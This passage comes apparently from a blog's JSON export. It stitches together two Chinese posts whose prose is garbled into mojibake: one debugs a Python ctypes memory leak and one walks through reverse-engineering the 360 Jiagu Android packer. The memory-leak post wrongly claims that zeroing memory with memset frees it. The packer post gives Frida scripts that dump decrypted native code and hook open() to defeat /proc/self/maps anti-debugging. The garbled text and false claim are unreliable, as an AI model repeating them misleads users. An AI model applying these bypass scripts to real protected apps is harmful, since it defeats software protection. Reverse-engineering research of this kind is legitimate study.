å†…å­˜æ³„æ¼ç‚¹ä¸€ è¿™ç¬¬ä¸€ä¸ªæ³„æ¼ç‚¹å¾ˆæ˜æ˜¾ï¼Œæ˜¯åœ¨ double.c ä¸­ï¼Œå› ä¸ºåœ¨ double_string ä¸­åªæœ‰ä¸€ä¸ªå­¤é›¶é›¶çš„ malloc , ä½†æ˜¯å´æ²¡æœ‰ free é™ªç€ä»–ï¼Œæ‰€ä»¥ç†æ‰€åº”å½“çš„å°±å†…å­˜æ³„æ¼äº† (malloc/realloc/colloc) å’Œ free å¿…é¡»ä¸¤ä¸¤å¯¹åº”æ‰ä¸ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ï¼Œmalloc å°±æ˜¯å‘ç³»ç»Ÿç”³è¯·ä¸€å—æŒ‡å®šå¤§å°çš„å†…å­˜ï¼Œfree åˆ™æ˜¯å‘ç³»ç»Ÿå½’è¿˜æŒ‡å®šåœ°å€å¼€å§‹çš„ä¸€å—å†…å­˜ åœ¨ c++ ä¸­ï¼Œ newå’Œdelete æˆ–è€… new[]å’Œdelete[] ä¹Ÿå¿…é¡»ä¸¤ä¸¤å¯¹åº”ï¼Œæ‰ä¸ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ ä½†æ˜¯è¿™ä¸ª free åº”è¯¥æ”¾åœ¨ä»€ä¹ˆåœ°æ–¹å‘¢ï¼Ÿé¦–å…ˆè‚¯å®šæ˜¯ä¸èƒ½åœ¨ double_string ä¸­ free çš„ï¼Œä¸ç„¶å¥½ä¸å®¹æ˜“æŠŠä¼ è¿›æ¥çš„å­—ç¬¦ä¸²å¤„ç†å¥½æ­£å‡†å¤‡ä½œä¸ºè¿”å›å€¼ä¼ å›å»ï¼Œä½ åæ‰‹ä¸€ä¸ª free ç›´æ¥æŠŠè¿”å›å€¼ç»™ free æ²¡äº†è¿™æ€ä¹ˆè¡Œå‘¢ æ‰€ä»¥è¿™ä¸ª free çš„æ—¶æœºåªèƒ½æ˜¯åœ¨ main.py ä¸­è°ƒç”¨å®Œ c_double_string ä¹‹åï¼Œpython ä¸­è¯¥æ€ä¹ˆæ‰§è¡Œ free å‡½æ•°å‘€ è¿™è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ è®© c å¯¼å‡ºä¸€ä¸ªé‡Šæ”¾å†…å­˜çš„å‡½æ•° c_free , ç„¶ååœ¨ python é‡Œé¢å†å»è°ƒç”¨å®ƒä¸å°±å¥½äº† ä½†æ˜¯è¿™æ ·ä¿®æ”¹äº†ä¹‹åï¼Œå†…å­˜ä¾ç„¶åœ¨ä¸æ–­çš„å¢åŠ  # å†…å­˜æ³„æ¼ç‚¹äºŒ å†…å­˜æ—¢ç„¶è¿˜åœ¨æ³„æ¼ï¼Œå¹¶ä¸” c è¯­è¨€é‡Œé¢ä¹Ÿæ²¡æœ‰æ³„æ¼ç‚¹äº†ï¼Œé‚£ä¹ˆå”¯ä¸€è¿˜æœ‰å¯èƒ½çš„æ³„æ¼ç‚¹å°±æ˜¯åœ¨ python ä¸­äº† åœ¨ python ä¸­è°ƒç”¨äº†ä¸‰ä¸ª ctypes ç›¸å…³çš„å‡½æ•°ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªåˆ†ææ¥çœ‹çœ‹æœ‰æ²¡æœ‰å¯èƒ½å­˜åœ¨çš„å†…å­˜æ³„æ¼ create_string_buffer è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯å°† bytes ç±»å‹è½¬æ¢æˆ char[] ç±»å‹ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œ buf å˜é‡çš„å†…å­˜æ˜¯é€šè¿‡ c_char * size æ¥åˆ†é…çš„ï¼Œç”±äºå†…å­˜æ˜¯åœ¨ python ä¸­åˆ†é…ï¼Œpython ä¼šè‡ªå·±æŠŠä¸ç”¨çš„å†…å­˜å›æ”¶æ‰ï¼Œæ‰€ä»¥è¿™é‡Œä¸ä¼šå†…å­˜æ³„æ¼ string_at è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯ä»ä¸€ä¸ªåœ°å€è¯»å–æŒ‡å®šé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œå®ƒä»…ä»…åªæ˜¯è¯»æ•°æ®æ‰€ä»¥æ ¹æœ¬å°±æ²¡æœ‰èƒ½åŠ›å»å¯¼è‡´å†…å­˜æ³„æ¼ cast å«Œç–‘äºº cast ç»ˆäºå‡ºç°äº†ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯å°†ä¸€ä¸ªæ•°æ®è½¬æ¢æˆæŒ‡å®šç±»å‹çš„æ•°æ® ctypes.cast(obj, type) æ­¤å‡½æ•°ç±»ä¼¼äº C çš„å¼ºåˆ¶è½¬æ¢è¿ç®—ç¬¦ã€‚ å®ƒè¿”å›ä¸€ä¸ª type çš„æ–°å®ä¾‹ï¼Œè¯¥å®ä¾‹æŒ‡å‘ä¸ obj ç›¸åŒçš„å†…å­˜å—ã€‚ type å¿…é¡»ä¸ºæŒ‡é’ˆç±»å‹ï¼Œè€Œ obj å¿…é¡»ä¸ºå¯ä»¥è¢«ä½œä¸ºæŒ‡é’ˆæ¥è§£è¯»çš„å¯¹è±¡ã€‚ æ‰¾æ‰¾è¿™ä¸ªå‡½æ•°åœ¨ python ä¸­çš„å®ç°æ˜¯ä»€ä¹ˆæ ·å­çš„ # Python39\\Lib\\ctypes\\__init__.pydef PYFUNCTYPE(restype, *argtypes): class CFunctionType(_CFuncPtr): _argtypes_ = argtypes _restype_ = restype _flags_ = _FUNCFLAG_CDECL | _FUNCFLAG_PYTHONAPI return CFunctionType_cast = PYFUNCTYPE(py_object, c_void_p, py_object, py_object)(_cast_addr)def cast(obj, typ): return _cast(obj, obj, typ)ç„¶åæˆ‘ä»¬å†å»è¿½è¸ª _cast_addr çš„å£°æ˜ï¼Œå‘ç° cast æ˜¯ä» _ctypes.pyd ä¸­å¯¼å‡ºçš„å‡½æ•° ä½†æ˜¯ _ctypes.pyd æ¯•ç«Ÿæ˜¯å·²ç»ç¼–è¯‘è¿‡çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œæˆ‘ä»¬å¸Œæœ›çœ‹åˆ°çš„æ˜¯ cast çš„æºç ï¼Œè€Œå®ƒåœ¨ python çš„ github ä»“åº“ä¸­å¯ä»¥æ‰¾åˆ°ï¼Œcast æºç  static PyObject * cast(void *ptr, PyObject *src, PyObject *ctype)&#123; CDataObject *result; // ç¡®ä¿è¢«è½¬æ¢çš„ç±»å‹æ˜¯ä¸€ä¸ªæŒ‡é’ˆ if (0 == cast_check_pointertype(ctype)) return NULL; result = (CDataObject *)_PyObject_CallNoArg(ctype); if (result == NULL) return NULL; /* The casted objects '_objects' member: It must certainly contain the source objects one. It must contain the source object itself. */ if (CDataObject_Check(src)) &#123; CDataObject *obj = (CDataObject *)src; CDataObject *container; /* PyCData_GetContainer will initialize src.b_objects, we need this so it can be shared */ container = PyCData_GetContainer(obj); if (container == NULL) goto failed; /* But we need a dictionary! */ if (obj->b_objects == Py_None) &#123; Py_DECREF(Py_None); obj->b_objects = PyDict_New(); if (obj->b_objects == NULL) goto failed; &#125; Py_XINCREF(obj->b_objects); result->b_objects = obj->b_objects; if (result->b_objects &amp;&amp; PyDict_CheckExact(result->b_objects)) &#123; PyObject *index; int rc; index = PyLong_FromVoidPtr((void *)src); if (index == NULL) goto failed; rc = PyDict_SetItem(result->b_objects, index, src); Py_DECREF(index); if (rc == -1) goto failed; &#125; &#125; /* Should we assert that result is a pointer type? */ memcpy(result->b_ptr, &amp;ptr, sizeof(void *)); return (PyObject *)result; failed: Py_DECREF(result); return NULL;&#125;è¿™é‡Œçš„ç¬¬ 50 è¡Œæœ‰ä¸€ä¸ª memcpy , ä½œç”¨æ˜¯å°† ptr çš„åœ°å€èµ‹å€¼ç»™ result-&gt;b_ptr , result-&gt;b_ptr æ˜¯ç»è¿‡ç±»å‹è½¬æ¢ä¹‹åæŒ‡å‘è½¬æ¢åå†…å­˜çš„æŒ‡é’ˆï¼Œè€Œè¿™ä¸ªå˜é‡ ptr ä¸å°±æ˜¯ cast ä¼ é€’è¿›æ¥çš„å‚æ•°ï¼ï¼Ÿ æˆ‘ä»¬å†æ¥çœ‹çœ‹ cast å‡½æ•°åœ¨ python ä¸­çš„å£°æ˜ï¼Œè¿™é‡Œå®šä¹‰äº†ä¸€ä¸ª cast , è¿”å›çš„æ˜¯ _cast , è€Œä¸”æˆ‘ä»¬å±…ç„¶å‘ç°å‚æ•° obj ç«Ÿç„¶åŒæ—¶æˆä¸ºäº† c ä¸­ cast çš„ç¬¬ä¸€ä¸ªå‚æ•° void *ptr å’Œç¬¬äºŒä¸ªå‚æ•° PyObject *src , è€Œä¸”è¿™ç¬¬ä¸€ä¸ªå‚æ•°å’Œç¬¬äºŒä¸ªå‚æ•°çš„ç±»å‹è¿˜ä¸ä¸€æ ·ï¼Œåˆ†åˆ«æ˜¯ c_void_p å’Œ py_object obj æ˜æ˜æ˜¯æˆ‘ä»¬å‡†å¤‡è¦ç±»å‹è½¬æ¢çš„ç›®æ ‡æ•°æ®ï¼Œæ€ä¹ˆå®ƒå¹»åŒ–å‡ºäº†å¦å¤–ä¸€ä¸ªç±»å‹ void *ptr æ¥ä½œä¸ºç»è¿‡ cast å‡½æ•°ç±»å‹è½¬æ¢ä¹‹åçš„å†…å­˜æŒ‡é’ˆå‘¢ï¼Ÿ è¿™å°±ä¸å¾—ä¸è¯´ä¸€ä¸‹ python ä¸­è°ƒç”¨å¤–éƒ¨å‡½æ•°çš„ä¸€ä¸ªæœºåˆ¶äº†ï¼Œå³å¼ºåˆ¶ç±»å‹è½¬æ¢ argtypes å½“è°ƒç”¨å¤–éƒ¨å‡½æ•°æ—¶ï¼Œæ¯ä¸ªå®é™…å‚æ•°éƒ½ä¼šè¢«ä¼ ç»™ argtypes å…ƒç»„ä¸­æ¡ç›®çš„ from_param() ç±»æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å…è®¸å°†å®é™…å‚æ•°é€‚é…ä¸ºæ­¤å¤–éƒ¨å‡½æ•°æ‰€æ¥å—çš„å¯¹è±¡ã€‚ ä¾‹å¦‚ï¼Œ argtypes å…ƒç»„ä¸­çš„ c_char_p æ¡ç›®å°†ä½¿ç”¨ ctypes è½¬æ¢è§„åˆ™æŠŠä½œä¸ºå‚æ•°ä¼ å…¥çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚ä¸²å¯¹è±¡ã€‚ æ‰€ä»¥è¯´ obj æœ¬èº«æ˜¯ py_object , ä½†æ˜¯ç”±äºè¿™ä¸ªæœºåˆ¶çš„å­˜åœ¨ï¼Œè¢«å¼ºåˆ¶è½¬æ¢ä¸ºäº† c_void_p , æˆ‘ä»¬ä¸å¦¨æ‰“å°å„ä¸ªå‚æ•°çš„åœ°å€æ¥å°è¯ä¸€ä¸‹ è¿™é‡Œæˆ‘ä»¬é€šè¿‡ cast å°† py_object å¼ºåˆ¶è½¬æ¢ä¸ºäº† c_void_p , å¯ä»¥å‘ç°ç¬¬ä¸€ä¸ªå‚æ•°çš„åœ°å€å’Œè¿”å›å€¼çš„åœ°å€æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ åœ¨è°ƒç”¨ cast å°†ç›®æ ‡æ•°æ®è½¬æ¢æˆç›®æ ‡ç±»å‹å‰ï¼Œpython åˆåˆ†é…äº†ä¸€å—æ–°çš„å†…å­˜æ¥å­˜å‚¨ç»è¿‡ cast è½¬æ¢ä¹‹åçš„ data, ç„¶è€Œåˆ†é…äº†å†…å­˜ä¹‹åå´æ²¡æœ‰å³æ—¶çš„é‡Šæ”¾è¿™å—å†…å­˜ï¼Œé€ æˆå†…å­˜æ³„æ¼ä¹Ÿä¸è¶³ä¸ºå¥‡äº† æ‰€ä»¥æˆ‘ä»¬ç°åœ¨è¦åšçš„å°±æ˜¯é‡Šæ”¾æ‰è¿™ä¸€å—å†…å­˜ï¼Œè€Œè¿™å¯ä»¥ä½¿ç”¨ ctypes.memset å®ç°ï¼Œå°†è¿™å—å†…å­˜å…¨éƒ¨éƒ½ç½®ä¸º 0, ä¸å°±ç›¸å½“äºæŠŠè¿™å—å†…å­˜ free æ‰äº†å˜› å†èµ·ä¸€ä¸ªæ— é™å¾ªç¯ï¼Œé€šè¿‡ä»»åŠ¡ç®¡ç†å™¨è§‚å¯Ÿ python è¿›ç¨‹çš„å†…å­˜å ç”¨ï¼Œç»ˆäºâ€¦ ä¸å†å†…å­˜æ³„æ¼äº†","categories":[],"tags":[]},{"title":"360åŠ å›ºdexè§£å¯†æµç¨‹åˆ†æ","slug":"360-jiagu","date":"2024-02-21T19:14:53.000Z","updated":"2024-07-22T14:27:04.000Z","comments":true,"path":"360-jiagu/","link":"","permalink":"https://oacia.dev/360-jiagu/","excerpt":"","text":"# å‰è¨€ åœ¨å»å¹´ 9 æœˆçš„æ—¶å€™ï¼Œæˆ‘å°±æƒ³ç ”ç©¶ä¸€ä¸‹ apk çš„åŠ å›ºï¼Œåœ¨ç½‘ä¸Šé€›äº†ä¸€åœˆï¼Œæ„Ÿè§‰ 360 åŠ å›ºä¸é”™ï¼Œæ‰€ä»¥å…ˆé€‰å®ƒå•¦ï¼Œå†™äº†ä¸€ä¸ªæµ‹è¯• apk ä¸¢åˆ° 360 åŠ å›ºé‡Œé¢åŠ å›ºäº†ä¸€ä¸‹ è¿™é‡Œæˆ‘ç”¨çš„æ˜¯ 360 åŠ å›ºçš„å…è´¹ç‰ˆ (å› ä¸ºä»˜è´¹ç‰ˆå¤ªè´µå•¦) æœ¬æ¥è®¡åˆ’ç€å»å¹´åˆ†æå®Œ 360 åŠ å›ºçš„ï¼Œä½†æ˜¯æ€»æ˜¯æŠ½ä¸å‡ºä¸€æ®µå®Œæ•´çš„æ—¶é—´æ¥æ‰€ä»¥å°±æ‹–åˆ°äº†ç°åœ¨ï¼Œç»ˆäºæœ€è¿‘å› ä¸ºè¿‡å¹´èµ‹é—²åœ¨å®¶ï¼Œå°±èŠ±äº†å‡ å¤©åˆ†æäº†ä¸€ä¸‹ 360 åŠ å›ºï¼Œæ„Ÿè§‰è¿™å‡ å¤©æ¢ç´¢ 360 åŠ å›ºçš„è¿‡ç¨‹çœŸæ˜¯å……æ»¡äº†æƒŠå–œå’Œä¹è¶£å‘¢ï½ 2024 å¹´ 3 æœˆ 8 å·è®°: è·ç¦»ä¸Šæ¬¡çœ‹ 360 åŠ å›ºå·²ç»åŠä¸ªæœˆå•¦ï¼Œä»Šå¤©æ­£æƒ³ç€è‡ªå·±è¦åšä»€ä¹ˆäº‹æƒ…çš„æ—¶å€™ï¼Œåˆ°åšå®¢çœ‹äº†çœ¼ TODOlist, çªç„¶å‘ç°å’¦æˆ‘æ˜¯ä¸æ˜¯è¿˜æ²¡çœ‹è¿‡ dex çš„è§£å¯†ç®—æ³•é•¿ä»€ä¹ˆæ ·ï¼Ÿæ‰€ä»¥ä»Šå¤©å°±æŠŠè¿™ä¸ªç»™åšå®Œäº†ï¼Œä¸å¾—ä¸è¯´é€†å‘çœŸçš„æ˜¯æ¶ˆç£¨æ— èŠæ—¶é—´æœ€æœ‰æ•ˆçš„æ–¹æ³•å“ˆå“ˆå“ˆ 360 åŠ å›ºæµ‹è¯• apk: ä¸‹è½½åœ°å€ æœªåŠ å›ºçš„åŸç‰ˆ apk: ä¸‹è½½åœ°å€ # java å±‚åˆæ­¥åˆ†æ åŒ…å: com.oacia.apk_protect å…¥å£: com.stub.StubApp æˆ‘ä»¬ä» AndroidManifest.xml ä¸­å¯ä»¥å¾—çŸ¥ï¼Œ360 åŠ å›ºçš„å…¥å£æ˜¯ com.stub.StubApp , æ‰€ä»¥æˆ‘ä»¬å°±å…ˆè¿›åˆ° apk çš„å…¥å£è¿›è¡Œåˆ†æ åœ¨è¿™ä¸ªå…¥å£ç±»ä¸­ï¼Œä¸ä»…æœ‰å¸¸è§„çš„ onCreate() å‡½æ•°ï¼Œè¿˜æœ‰ä¸€ä¸ªå‡½æ•°å€¼å¾—æ³¨æ„ï¼Œä»–å°±æ˜¯ attachBaseContext(Context context) Application çš„ onCreate å’Œ attachBaseContext æ˜¯ Application çš„ä¸¤ä¸ªå›è°ƒæ–¹æ³•ï¼Œé€šå¸¸æˆ‘ä»¬ä¼šåœ¨å…¶ä¸­åšä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œ attachBaseContext åœ¨ onCreate ä¹‹å‰æ‰§è¡Œ å…¶ä¸­å‡ºç°çš„å­—ç¬¦ä¸²ç»è¿‡äº†åŠ å¯†æ··æ·†æ“ä½œï¼ŒåŠ å¯†å‡½æ•°å¦‚ä¸‹ï¼Œç®—æ³•æ˜¯å°†æ‰€æœ‰çš„å­—ç¬¦ä¸ 16 è¿›è¡Œå¼‚æˆ– æˆ‘ä»¬å†™ä¸ª jeb è„šæœ¬æŠŠåŠ å¯†å­—ç¬¦ä¸²è§£å¯†æ¥æ–¹ä¾¿åç»­çš„é™æ€åˆ†æ # coding=utf-8from com.pnfsoftware.jeb.client.api import IScript, IconType, ButtonGroupTypefrom com.pnfsoftware.jeb.core import RuntimeProjectUtilfrom com.pnfsoftware.jeb.core.units.code.java import IJavaSourceUnitfrom com.pnfsoftware.jeb.core.units.code import ICodeUnit, ICodeItemfrom com.pnfsoftware.jeb.core.output.text import ITextDocumentfrom com.pnfsoftware.jeb.core.units.code.java import IJavaSourceUnit, IJavaStaticField, IJavaNewArray, IJavaConstant, IJavaCall, IJavaField, IJavaMethod, IJavaClassfrom com.pnfsoftware.jeb.core.events import JebEvent, Jfrom com.pnfsoftware.jeb.core.util import DecompilerHelper# è§£å¯†å­—ç¬¦ä¸²å‡½æ•°çš„ç±»åä»¥åŠæ–¹æ³•åmethodName = ['Lcom/qihoo/util/a;', 'a']class dec_str_360jiagu(IScript): def run(self, ctx): print('start deal with strings') self.ctx = ctx engctx = ctx.getEnginesContext() if not engctx: print('Back-end engines not initialized') return projects = engctx.getProjects() if not projects: print('There is no opened project') return units = RuntimeProjectUtil.findUnitsByType(projects[0], IJavaSourceUnit, False) for unit in units: javaClass = unit.getClassElement() print('[+] decrypt:' + javaClass.getName()) self.cstbuilder = unit.getFactories().getConstantFactory() self.processClass(javaClass) unit.notifyListeners(JebEvent(J.UnitChange)) print('Done.') def processClass(self, javaClass): if javaClass.getName() == methodName[0]: return for method in javaClass.getMethods(): block = method.getBody() i = 0 while i &lt; block.size(): stm = block.get(i) self.checkElement(block, stm) i += 1 def checkElement(self, parent, e): try: if isinstance(e, IJavaCall): mmethod = e.getMethod() mname = mmethod.getName() msig = mmethod.getSignature() if mname == methodName[1] and methodName[0] in msig: v = [] for arg in e.getArguments(): if isinstance(arg, IJavaConstant): v.append(arg.getString()) if len(v) == 1: decstr = self.decryptstring(v[0]) parent.replaceSubElement(e, self.cstbuilder.createString(decstr)) for subelt in e.getSubElements(): if isinstance(subelt, IJavaClass) or isinstance(subelt, IJavaField) or isinstance(subelt, IJavaMethod): continue self.checkElement(e, subelt) except: print('error') def decryptstring(self, string): src = [] for index, char in enumerate(string): src.append(chr(ord(char) ^ 16)) return ''.join(src).decode('unicode_escape')è§£å¯†åçš„æ•ˆæœå¦‚ä¸‹ æˆ‘ä»¬å¾€ä¸‹è¿›è¡Œåˆ†æï¼Œå¯ä»¥çŸ¥é“ attachBaseContext çš„ç¬¬ä¸€ä¸ªä½œç”¨æ˜¯æ ¹æ®ç›®æ ‡æ‰‹æœºçš„æ¶æ„åŠ è½½ libjiagu_xxx.so å¦‚å›¾ è¿™äº› so åœ¨ assets ç›®å½•ä¸‹ åœ¨åŠ è½½å®Œ libjiagu_xxx.so ä¹‹åï¼Œè¿˜è°ƒç”¨äº† DtcLoader ç±»è¿›è¡Œåˆå§‹åŒ–ï¼Œè¿™é‡Œä½¿ç”¨çš„ jadx çš„åç¼–è¯‘ç»“æœï¼Œå› ä¸º jeb æ²¡æœ‰åç¼–è¯‘å‡º DtcLoader.init(); æ–¹æ³•æ¥ DtcLoader ç±»å¦‚å›¾æ‰€ç¤º å½“ DtcLoader ç±»è¢«åŠ è½½åˆ° JVM ä¸­æ—¶ï¼Œä¼šå»åŠ è½½ libjgdtc.so , å¦‚æœåŠ è½½å¤±è´¥ï¼Œåˆ™ä¼šå°è¯•ä» /data/app/com.oacia.apk_protect/lib/arm64/libjgdtc.so æˆ–è€… /data/data/com.oacia.apk_protect/lib/libjgdtc.so ä¸­å»åŠ è½½è¿™ä¸ª so ä½†æ˜¯å½“æˆ‘ä»¬å»è¿›å…¥åˆ°è¿™ä¸¤ä¸ªç›®å½•è¿›è¡Œå¯»æ‰¾æ—¶ï¼Œå´å‘ç°æ²¡æœ‰è¿™ä¸ª libjgdtc.so å­˜åœ¨ æ‰€ä»¥æˆ‘ä»¬çš„åˆ†æé‡ç‚¹æ˜¯åœ¨ libjiagu.so ä¸­ï¼Œè¿™é‡Œæˆ‘é€‰å–äº† arm64 æ¶æ„çš„ so æ–‡ä»¶ libjiagu_a64.so è¿›è¡Œåˆ†æ # å£³ ELF å¯¼å…¥å¯¼å‡ºè¡¨ä¿®å¤ æˆ‘ä»¬ä½¿ç”¨ ida åˆ†æ libjiagu_a64.so , å‘ç°å¯¼å…¥è¡¨å’Œå¯¼å‡ºè¡¨éƒ½æ²¡æœ‰å†…å®¹ï¼Œæ—¢ç„¶æ˜¯è¿™ç§æƒ…å†µï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯åœ¨ so è£…è½½è¿›å†…å­˜æ—¶å¯¼å…¥å¯¼å‡ºè¡¨æ‰ä¼šå»è¿›è¡Œç›¸åº”çš„é“¾æ¥æ“ä½œ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆç”¨ frida æŠŠè¿™ä¸ª so ç»™ dump ä¸‹æ¥ é¦–å…ˆæˆ‘ä»¬åœ¨æ‰‹æœºä¸Šè¿è¡Œä¸€ä¸‹ frida server PS D:\\frida> adb shellblueline:/ $ sublueline:/ # cd /data/local/tmpblueline:/data/local/tmp # ./fs -l 0.0.0.0:1234éšååšä¸€ä¸‹ç«¯å£è½¬å‘ adb forward tcp:1234 tcp:1234frida å‘½ä»¤è¡Œè¯­å¥å¦‚ä¸‹ frida -H 127.0.0.1:1234 -l .\\hook.js -f \"com.oacia.apk_protect\"æ³¨å…¥å¦‚ä¸‹è„šæœ¬ function my_hook_dlopen(soName = '') &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); if (path.indexOf(soName) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; dump_so(\"libjiagu_64.so\"); &#125; &#125; &#125; );&#125;function dump_so(so_name) &#123; var libso = Process.getModuleByName(so_name); console.log(\"[name]:\", libso.name); console.log(\"[base]:\", libso.base); console.log(\"[size]:\", ptr(libso.size)); console.log(\"[path]:\", libso.path); var file_path = \"/data/data/com.oacia.apk_protect/\" + libso.name + \"_\" + libso.base + \"_\" + ptr(libso.size) + \".so\"; var file_handle = new File(file_path, \"wb\"); if (file_handle &amp;&amp; file_handle != null) &#123; Memory.protect(ptr(libso.base), libso.size, 'rwx'); var libso_buffer = ptr(libso.base).readByteArray(libso.size); file_handle.write(libso_buffer); file_handle.flush(); file_handle.close(); console.log(\"[dump]:\", file_path); &#125;&#125;setImmediate(my_hook_dlopen(\"libjiagu_64.so\")); éšåæˆ‘ä»¬ä½¿ç”¨ SoFixer ä¿®å¤ä¸€ä¸‹è¿™ä¸ª so, è¿™é‡Œçš„ -m å‚æ•°å³è¿™ä¸ª so åœ¨å†…å­˜ä¸­çš„ base åŸºåœ°å€ .\\SoFixer-Windows-64.exe -s .\\libjiagu_64.so_0x74a2845000_0x274000.so -o .\\libjiagu_64_0x74a2845000_0x274000_fix.so -m 0x74a2845000 -dä¿®å¤å®Œæˆåï¼Œå¯¼å…¥è¡¨å’Œå¯¼å‡ºè¡¨å°±æ¢å¤äº† # åŠ å›ºå£³åè°ƒè¯•åˆæ­¥åˆ†æ é¦–å…ˆæˆ‘ä»¬å» hook ä¸€ä¸‹æ‰“å¼€ so çš„å‡½æ•° function hook_dlopen() &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); console.log(\"load \" + path); &#125; &#125; &#125; );&#125;setImmediate(hook_dlopen)æ—¥å¿—å¦‚ä¸‹ï¼Œæ‰€ä»¥åè°ƒè¯•æ˜¯åœ¨ libjiagu_64.so ä¸­ load libstats_jni.soload /data/app/~~P6meiEqXSQZrP2ChUgVgOg==/com.oacia.apk_protect-ezyVSLdtBZmLTZejgPlSoQ==/oat/arm64/base.odexload /data/data/com.oacia.apk_protect/.jiagu/libjiagu_64.soç„¶åå» hook æ‰“å¼€æ–‡ä»¶çš„å‡½æ•° open function my_hook_dlopen(soName = '') &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); if (path.indexOf(soName) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; hook_open(); &#125; &#125; &#125; );&#125;function hook_open()&#123; var pth = Module.findExportByName(null,\"open\"); Interceptor.attach(ptr(pth),&#123; onEnter:function(args)&#123; this.filename = args[0]; console.log(\"\",this.filename.readCString()) &#125;,onLeave:function(retval)&#123; &#125; &#125;)&#125;setImmediate(my_hook_dlopen,\"libjiagu\");æ—¥å¿—å¦‚ä¸‹ è¿™é‡Œæˆ‘ä»¬å‘ç°äº† /proc/self/maps , è¿™æ˜¯å¸¸è§çš„åè°ƒè¯•ï¼Œè¦ç»•è¿‡è¿™ä¸ªæ£€æµ‹ï¼Œæˆ‘ä»¬å¯ä»¥å¤‡ä»½ä¸€ä¸ªæ­£å¸¸çš„ maps æ–‡ä»¶ï¼Œç„¶åç”¨ frida å» hook open å‡½æ•°ï¼Œå¦‚æœåŒ¹é…åˆ°å­—ç¬¦ä¸² maps , å°±å°†å­—ç¬¦ä¸²é‡å®šå‘åˆ°æˆ‘ä»¬å¤‡ä»½çš„ maps æ–‡ä»¶ é¦–å…ˆæˆ‘ä»¬æ­£å¸¸æ‰“å¼€ä¸€æ¬¡åŠ å£³çš„ apk, ç„¶åä½¿ç”¨ä¸‹åˆ—å‘½ä»¤å¤‡ä»½ maps cp /proc/self/maps /data/data/com.oacia.apk_protect/mapsç„¶åæˆ‘ä»¬æ³¨å…¥å¦‚ä¸‹ frida è„šæœ¬ function my_hook_dlopen(soName = '') &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); if (path.indexOf(soName) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; hook_proc_self_maps(); &#125; &#125; &#125; );&#125;function hook_proc_self_maps() &#123; const openPtr = Module.getExportByName(null, 'open'); const open = new NativeFunction(openPtr, 'int', ['pointer', 'int']); var fakePath = \"/data/data/com.oacia.apk_protect/maps\"; Interceptor.replace(openPtr, new NativeCallback(function (pathnameptr, flag) &#123; var pathname = Memory.readUtf8String(pathnameptr); console.log(\"open\",pathname); if (pathname.indexOf(\"maps\") >= 0) &#123; console.log(\"find\",pathname,\",redirect to\",fakePath); var filename = Memory.allocUtf8String(fakePath); return open(filename, flag); &#125; var fd = open(pathnameptr, flag); return fd; &#125;, 'int', ['pointer', 'int']));&#125;setImmediate(my_hook_dlopen,\"libjiagu\");ä½†æ˜¯å½“æ³¨å…¥è¿™æ®µè„šæœ¬åï¼Œè¿›ç¨‹ç”±äºéæ³•å†…å­˜è®¿é—®è€Œé€€å‡ºäº†ï¼Œè¿™è¯´æ˜ 360 åŠ å›ºä¸ä»…è¯»å– maps æ–‡ä»¶ï¼Œå¹¶ä¸”ä¼šå°è¯•è®¿é—® maps æ–‡ä»¶ä¸­æ‰€è®°å½•çš„æ–‡ä»¶æˆ–å†…å­˜æ˜ å°„ã€‚è¿™é‡Œç”±äº frida æ³¨å…¥åé‡å¯ apk, ä½†æ˜¯å¤‡ä»½çš„ maps æ–‡ä»¶ä¸­è®°å½•çš„æ˜¯å…ˆå‰çš„æ˜ å°„èµ·å§‹åœ°å€ (è¿™å—å†…å­˜åœ¨å…³é—­ apk åå°±è¢«æŠ¹å»äº†), æ‰€ä»¥å½“å£³å°è¯•è®¿é—®å…¶ä¸­çš„æ˜ å°„æ—¶äº§ç”Ÿäº†éæ³•å†…å­˜è®¿é—®ä»è€Œè®©è¿›ç¨‹å´©æºƒ è¿™é‡Œæˆ‘çš„è§£å†³æ–¹å¼æ˜¯å°†ä¸Šè¿° frida ä»£ç ä¸­çš„ fakePath èµ‹å€¼ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ä¾‹å¦‚ /data/data/com.oacia.apk_protect/maps_nonexistent , æ¥è®©å£³æ²¡æœ‰å†…å®¹å¯ä»¥è®¿é—® ä¿®æ”¹å®Œ fakePath åé‡æ–°æ³¨å…¥ä»£ç 